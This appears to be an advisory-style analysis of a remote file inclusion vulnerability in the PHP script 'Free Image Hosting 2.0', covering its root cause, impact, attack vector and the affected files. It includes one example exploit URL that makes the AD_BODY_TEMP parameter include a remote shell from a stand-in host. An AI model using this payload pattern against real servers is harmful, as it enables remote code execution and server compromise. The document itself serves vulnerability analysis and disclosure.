Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause of Vulnerability:**

The root cause is the insecure use of the `include()` function in multiple PHP files within the "Free Image Hosting 2.0" script (also referred to as "File Upload System" in one of the sources). The script uses a user-controlled parameter `AD_BODY_TEMP` directly in the `include()` function.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is RFI.  The `AD_BODY_TEMP` parameter allows an attacker to specify an arbitrary URL, which will then be included and executed by the vulnerable PHP scripts.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** Successful exploitation allows an attacker to execute arbitrary code on the server hosting the vulnerable application. This could lead to a full compromise of the server, data theft, defacement, or other malicious activities.

**Attack Vectors:**

*   **HTTP GET Parameter:** The attack vector is through a GET request to the vulnerable PHP files, where the `AD_BODY_TEMP` parameter is included in the URL. Example: `www.site.com/imageupload_path/login.php?AD_BODY_TEMP=http://evil.com/shell.php`.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the vulnerable server.
*   **Ability to host a malicious file:** The attacker needs to host a malicious file (e.g., a PHP shell) on a server accessible to the vulnerable server.
*   **Basic knowledge of HTTP and web attacks:** The attacker should understand how to craft a URL with a GET parameter.

**Additional Notes:**

*   The vulnerability exists in multiple files, including `contact.php`, `forgot_pass.php`, `login.php`, `register.php`, and `send.php`.
*   The exploit-db entry mentions "Free Image Hosting 2.0" which is likely a newer version of "Free File Hosting 1.1".
*   The provided information suggests that the `AD_BODY_TEMP` parameter is used across different scripts from what was initially indicated in the CVE description.
